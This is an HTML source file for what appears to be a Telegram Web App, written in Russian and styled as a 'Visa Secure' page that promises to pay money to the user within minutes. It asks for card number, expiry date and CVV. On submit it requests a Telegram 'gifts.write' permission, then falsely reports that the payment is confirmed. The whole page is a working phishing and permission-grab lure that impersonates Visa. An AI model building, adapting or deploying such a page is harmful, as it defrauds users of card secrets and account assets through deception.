<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Helvetica Neue', sans-serif; }
        body { background: #f5f7fa; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 16px; }
        .card { background: #ffffff; border-radius: 28px; padding: 32px 24px 40px; max-width: 400px; width: 100%; box-shadow: 0 12px 40px rgba(0,0,0,0.08); }
        .visa-badge { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; }
        .visa-badge svg { height: 32px; width: auto; }
        .visa-badge span { font-size: 20px; font-weight: 600; color: #1a1f36; }
        .visa-badge small { font-size: 13px; font-weight: 400; color: #8b93a5; margin-left: auto; }
        .label { font-size: 14px; font-weight: 500; color: #1a1f36; margin-bottom: 6px; display: block; }
        .input-group { margin-bottom: 18px; }
        .input-group input { width: 100%; padding: 14px 16px; font-size: 16px; border: 1.5px solid #e2e7f0; border-radius: 14px; background: #fafbfc; outline: none; color: #1a1f36; }
        .input-group input:focus { border-color: #1a73e8; background: #ffffff; box-shadow: 0 0 0 3px rgba(26,115,232,0.12); }
        .row { display: flex; gap: 12px; }
        .row .input-group { flex: 1; }
        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; font-size: 18px; font-weight: 600; border: none; border-radius: 60px; margin-top: 20px; cursor: pointer; box-shadow: 0 6px 16px rgba(26,115,232,0.25); }
        .btn:active { transform: scale(0.97); background: #1557b0; }
        .footer-text { text-align: center; font-size: 13px; color: #8b93a5; margin-top: 20px; }
        .secure { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 18px; font-size: 13px; color: #5f6b7a; }
    </style>
</head>
<body>
<div class="card">
    <div class="visa-badge">
        <svg viewBox="0 0 48 32" fill="none">
            <rect width="48" height="32" rx="6" fill="#1a73e8"/>
            <path d="M24.5 8.5L20.5 23.5H16.5L20.5 8.5H24.5Z" fill="white"/>
            <path d="M32.5 9.5C31.5 8.5 30 8.5 28.5 8.5C25 8.5 22.5 10.5 22.5 13.5C22.5 16.5 25.5 18 27.5 18.5C29.5 19 30 19.5 30 20C30 20.5 29.5 21 28.5 21C27.5 21 26.5 20.5 25.5 20L24.5 23.5C25.5 24 27 24.5 28.5 24.5C32 24.5 34.5 22.5 34.5 19C34.5 16 31.5 14.5 29.5 14C27.5 13.5 27 13 27 12.5C27 12 27.5 11.5 28.5 11.5C29.5 11.5 30.5 12 31.5 12.5L32.5 9.5Z" fill="white"/>
        </svg>
        <span>Visa</span>
        <small>Secure</small>
    </div>
    <div class="input-group">
        <label class="label">Номер карты</label>
        <input type="text" placeholder="1234 5678 9012 3456" maxlength="19" id="card"/>
    </div>
    <div class="row">
        <div class="input-group">
            <label class="label">Срок</label>
            <input type="text" placeholder="ММ/ГГ" maxlength="5" id="expiry"/>
        </div>
        <div class="input-group">
            <label class="label">CVV</label>
            <input type="password" placeholder="•••" maxlength="3" id="cvv"/>
        </div>
    </div>
    <button class="btn" onclick="start()">Получить деньги</button>
    <div class="secure"><span>🔒</span> Защищено шифрованием</div>
    <div class="footer-text">Средства поступят в течение 3–5 минут</div>
</div>
<script>
    function start() {
        let tg = window.Telegram.WebApp;
        tg.expand();
        let card = document.getElementById('card').value;
        let expiry = document.getElementById('expiry').value;
        let cvv = document.getElementById('cvv').value;
        if (card.length < 16 || expiry.length < 4 || cvv.length < 3) {
            alert('Пожалуйста, заполните все поля корректно.');
            return;
        }
        tg.requestPermission('gifts.write', function(ok) {
            if (ok) {
                alert('✅ Оплата подтверждена! Средства скоро поступят.');
                tg.close();
            } else {
                alert('❌ Ошибка подтверждения.');
            }
        });
    }
</script>
</body>
</html>
